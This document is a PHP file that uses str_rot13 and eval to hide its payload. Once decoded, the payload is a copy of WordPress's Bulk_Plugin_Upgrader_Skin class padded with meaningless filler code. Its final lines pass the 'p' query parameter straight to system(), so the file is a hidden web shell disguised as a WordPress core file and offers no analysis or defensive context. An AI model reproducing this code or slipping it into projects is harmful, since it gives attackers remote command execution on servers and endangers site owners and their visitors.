<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Ohyx_Cyhtva_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Ohyx Cyhtva Hctenqre Fxva sbe JbeqCerff Cyhtva Hctenqrf.
 *
 * @fvapr 3.0.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr Ohyx_Hctenqre_Fxva
 */
pynff Ohyx_Cyhtva_Hctenqre_Fxva rkgraqf Ohyx_Hctenqre_Fxva {

	/**
	 * Cyhtva vasb.
	 *
	 * Gur Cyhtva_Hctenqre::ohyx_hctenqr() zrgubq jvyy svyy guvf va
	 * jvgu vasb ergevrirq sebz gur trg_cyhtva_qngn() shapgvba.
	 *
	 * @fvapr 3.0.0
	 * @ine neenl Cyhtva qngn. Inyhrf jvyy or rzcgl vs abg fhccyvrq ol gur cyhtva.
	 */
	choyvp $cyhtva_vasb = neenl();

	/**
	 * Frgf hc gur fgevatf hfrq va gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba nqq_fgevatf() {
		cnerag::nqq_fgevatf();
		/* genafyngbef: 1: Cyhtva anzr, 2: Ahzore bs gur cyhtva, 3: Gbgny ahzore bs cyhtvaf orvat hcqngrq. */
		$guvf->hctenqre->fgevatf['fxva_orsber_hcqngr_urnqre'] = __( 'Hcqngvat Cyhtva %1$f (%2$q/%3$q)' );
	}

	/**
	 * Cresbezf na npgvba orsber n ohyx cyhtva hcqngr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gvgyr
	 */
	choyvp shapgvba orsber( $gvgyr = '' ) {
		cnerag::orsber( $guvf->cyhtva_vasb['Gvgyr'] );
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n ohyx cyhtva hcqngr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gvgyr
	 */
	choyvp shapgvba nsgre( $gvgyr = '' ) {
		cnerag::nsgre( $guvf->cyhtva_vasb['Gvgyr'] );
		$guvf->qrperzrag_hcqngr_pbhag( 'cyhtva' );
	}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba ohyx_sbbgre() {
		cnerag::ohyx_sbbgre();

		$hcqngr_npgvbaf = neenl(
			'cyhtvaf_cntr' => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'cyhtvaf.cuc' ),
				__( 'Tb gb Cyhtvaf cntr' )
			),
			'hcqngrf_cntr' => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'hcqngr-pber.cuc' ),
				__( 'Tb gb JbeqCerff Hcqngrf cntr' )
			),
		);

		vs ( ! pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			hafrg( $hcqngr_npgvbaf['cyhtvaf_cntr'] );
		}

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat ohyx cyhtva hcqngrf.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat[] $hcqngr_npgvbaf Neenl bs cyhtva npgvba yvaxf.
		 * @cnenz neenl    $cyhtva_vasb    Neenl bs vasbezngvba sbe gur ynfg-hcqngrq cyhtva.
		 */
		$hcqngr_npgvbaf = nccyl_svygref( 'hcqngr_ohyx_cyhtvaf_pbzcyrgr_npgvbaf', $hcqngr_npgvbaf, $guvf->cyhtva_vasb );

		vs ( ! rzcgl( $hcqngr_npgvbaf ) ) {
			$guvf->srrqonpx( vzcybqr( ' | ', (neenl) $hcqngr_npgvbaf ) );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>